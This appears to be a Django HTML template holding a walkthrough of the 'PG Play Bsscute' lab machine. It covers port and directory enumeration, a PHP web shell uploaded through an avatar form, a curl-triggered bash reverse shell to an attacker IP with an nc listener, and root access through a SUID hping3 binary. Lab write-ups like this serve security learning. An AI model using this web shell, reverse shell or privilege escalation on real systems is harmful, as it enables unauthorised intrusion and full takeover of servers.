@@ -1,0 +1,173 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">PG Play Bsscute</h1>
+    <p class="text">Difficulty Easy | Community Rating : Intermediate</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV $IP --min-rate=100000</u>
+PORT      STATE    SERVICE   VERSION
+22/tcp    open     ssh       OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 04:d0:6e:c4:ba:4a:31:5a:6f:b3:ee:b8:1b:ed:5a:b7 (RSA)
+|   256 24:b3:df:01:0b:ca:c2:ab:2e:e9:49:b0:58:08:6a:fa (ECDSA)
+|_  256 6a:c4:35:6a:7a:1e:7e:51:85:5b:81:5c:7c:74:49:84 (ED25519)
+80/tcp    open     http      Apache httpd 2.4.38 ((Debian))
+|_http-title: Apache2 Debian Default Page: It works
+|_http-server-header: Apache/2.4.38 (Debian)
+88/tcp    open     http      nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+|_http-title: 404 Not Found
+110/tcp   open     pop3      Courier pop3d
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
+| Subject Alternative Name: email:postmaster@example.com
+| Not valid before: 2020-09-17T16:28:06
+|_Not valid after:  2021-09-17T16:28:06
+|_pop3-capabilities: UTF8(USER) LOGIN-DELAY(10) TOP PIPELINING IMPLEMENTATION(Courier Mail Server) UIDL STLS USER
+995/tcp   open     ssl/pop3  Courier pop3d
+|_pop3-capabilities: LOGIN-DELAY(10) TOP PIPELINING IMPLEMENTATION(Courier Mail Server) UTF8(USER) UIDL USER
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
+| Subject Alternative Name: email:postmaster@example.com
+| Not valid before: 2020-09-17T16:28:06
+|_Not valid after:  2021-09-17T16:28:06
+3605/tcp  filtered comcam-io
+26687/tcp filtered unknown
+41369/tcp filtered unknown
+54574/tcp filtered unknown
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+
+<p class="text">The open ports which we can target are 80 and 88. First I will start from port 80.</p>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/bsscute/1.png' %}" alt="">
+    <p class="text">The first page is apache default page. There is no interesting information, so I'll enumerate directory next.</p>
+</div>
+
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$IP -t 100</u>
+===============================================================
+[+] Url:                     http://192.168.239.128
+[+] Method:                  GET
+[+] Threads:                 70
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.htpasswd            (Status: 403) [Size: 280]
+/.hta                 (Status: 403) [Size: 280]
+/.htaccess            (Status: 403) [Size: 280]
+/core                 (Status: 301) [Size: 317] [--&gt; http://192.168.239.128/core/]
+/docs                 (Status: 301) [Size: 317] [--&gt; http://192.168.239.128/docs/]
+/favicon.ico          (Status: 200) [Size: 1150]
+/index.html           (Status: 200) [Size: 10701]
+/<u>index.php</u>            (Status: 200) [Size: 6175]
+/libs                 (Status: 301) [Size: 317] [--&gt; http://192.168.239.128/libs/]
+/manual               (Status: 301) [Size: 319] [--&gt; http://192.168.239.128/manual/]
+/server-status        (Status: 403) [Size: 280]
+/skins                (Status: 301) [Size: 318] [--&gt; http://192.168.239.128/skins/]
+/uploads              (Status: 301) [Size: 320] [--&gt; http://192.168.239.128/uploads/]
+
+===============================================================</code></pre></div>
+
+<p class="text">There are many suceptable pages, but I will start from index.php.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/bsscute/2.png' %}" alt="">
+    <img src="{% static 'EthHack/images/bsscute/3.png' %}" alt="">
+</div>
+
+    <p class="text">On the register page, I couldn't find any 'Capcha'. But on the inspector, I could find php file which generates Capcha.</p>
+
+
+    <div class="img">
+        <img src="{% static 'EthHack/images/bsscute/4.png' %}" alt="">
+        <p class="text">On the page, I could find Capcha texts. I will use this for account registration.</p>
+    </div>
+
+
+    <h2 class="subtitle">Foothold</h2>
+    <div class="img">
+        <img src="{% static 'EthHack/images/bsscute/5.png' %}" alt="">
+        <p class="text">After login, there is personal option page and it has avatar upload form. It's not rare case we can upload malicious file via this kind of form. So I tried that.</p>
+    </div>
+
+    <p class="text">I successfully uploaded web-shell php file with code below:</p>
+    <div class="code-box"><pre><code>&lt;?php system($_REQUEST['cmd']);?&gt;</code></pre></div>
+
+    <p class="text">And the file is stored in <u>http://cute.calipendula/uploads/avatar_test_simple_shell.php</u> page. I can gat reverse shell using this file like below...</p>
+
+
+    <div class="code-box"><pre><code>└─$ <u>curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tc92.168.45.205/4444 0>&1"' http://cute.calipendula/uploads/ava_test_simple_shell.php</u>
+        
+└─$ <u>nc -lvnp 4444</u>
+listening on [any] 4444 ...
+connect to [192.168.45.205] from (UNKNOWN) [192.168.239.128] 54908
+bash: cannot set terminal process group (760): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@cute:/var/www/html/uploads$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre></div>
+
+<p class="text">I got www-data user.</p>
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<div class="code-box"><pre><code>www-data@cute:/etc/nginx$ sudo -l
+Matching Defaults entries for www-data on cute:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on cute:
+    (root) NOPASSWD: /usr/sbin/hping3 --icmp</code></pre></div>
+
+
+    <p class="text">Though this user has sudo privilege, we have to declare other options like host for PE, therefore, I cannot use this for it.</p>
+
+<div class="code-box"><pre><code>www-data@cute:/etc/nginx$ find / -perm -4000 2>/dev/null
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/pkexec
+/usr/bin/sudo
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/fusermount
+/usr/bin/passwd
+/usr/bin/mount
+<u>/usr/sbin/hping3</u>
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device</code></pre></div>
+
+<p class="text">However, there is the same output /usr/sbin/hping3, and it has SUID. Therefore, we can implement PrivEsc without sudo command.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/bsscute/6.png' %}" alt="">
+    <p class="text">According to GTFOBins, we can simply declare <u>/bin/bash -i</u> after launching /usr/sbin/hping3.</p>
+</div>
+
+<div class="code-box"><pre><code>www-data@cute:/etc/nginx$ /usr/sbin/hping3
+hping3> /bin/sh -p
+# id
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)</code></pre></div>
+
+<p class="text">You can find proof flag on /root directory.</p>
+
+
+</body>
+</html>
